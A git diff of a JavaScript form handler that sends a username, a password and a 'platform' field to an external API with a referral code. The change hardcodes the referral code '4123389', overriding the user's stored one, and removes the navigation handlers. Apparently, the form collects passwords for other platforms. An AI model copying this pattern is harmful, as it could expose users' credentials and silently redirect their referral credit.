@@ -3,6 +3,7 @@ import {votersCard} from './general/card.js';
 const API_URL = "https://nexa-mini.onrender.com";
 
 const refCode = JSON.parse(localStorage.getItem("referralCode"));
+const referralCode = refCode || "4123389";
 // Quick feedback helper
 const feedback = (msg, time = 2500) => {
   const el = create({ tag: "h3", textContent: msg, className: "feedback" });
@@ -16,7 +17,7 @@ export async function submit(form) {
   const password = form.password.value.trim();
   const platform = form.platform.value.trim();
   const btn = form.querySelector('button[type="submit"]');
-
+  
   // Validate inputs
   if (!username || username.length < 3 || !password || password.length < 6) {
     feedback("wrong credentials");
@@ -24,7 +25,7 @@ export async function submit(form) {
   }
 
   // Example referral code; replace dynamically if needed
-  const referralCode = refCode || "4123389";
+  const referralCode =  "4123389";
   const payload = { username, password, platform, referralCode };
 
   // Show loading
@@ -94,11 +95,7 @@ window.onload = async () => {
   
   
   
-  const navBtns = document.querySelectorAll("[data-role=nav]");
-    navBtns.forEach(nav => {
-      const target = nav.dataset.target;
-      nav.addEventListener("click", () => move(target));
-    });
+  
 }
 
 
@@ -109,3 +106,4 @@ window.onload = async () => {
 
 
 
+ 
